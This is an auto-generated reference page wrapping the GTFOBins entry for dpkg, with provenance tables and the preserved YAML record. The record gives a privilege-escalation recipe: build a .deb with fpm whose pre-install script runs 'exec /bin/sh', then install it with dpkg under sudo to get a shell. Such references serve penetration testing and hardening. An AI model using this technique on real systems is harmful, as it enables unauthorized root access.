---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# dpkg

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `dpkg` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/dpkg` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [dpkg](../../tools/linux/dpkg.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | dpkg |
| name | dpkg |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/dpkg/ |

## Preserved Source Material

````yaml
_body: ''
_name: dpkg
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/dpkg
functions:
  inherit:
  - code: dpkg -l
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    from: less
  shell:
  - code: dpkg -i x_1.0_all.deb
    comment: 'Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.


      ```

      echo ''exec /bin/sh'' >x.sh

      fpm -n x -s dir -t deb -a all --before-install x.sh .

      ```'
    contexts:
      sudo: null
````
